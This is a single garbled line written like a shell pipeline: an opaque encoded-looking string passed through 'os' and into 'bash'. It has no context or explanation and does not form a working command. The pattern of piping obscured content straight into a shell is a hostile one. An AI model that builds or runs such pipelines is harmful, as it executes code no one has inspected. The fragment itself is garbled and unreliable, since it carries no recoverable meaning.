Encode > X85oX4824x91504x95r32/5x | os | bash
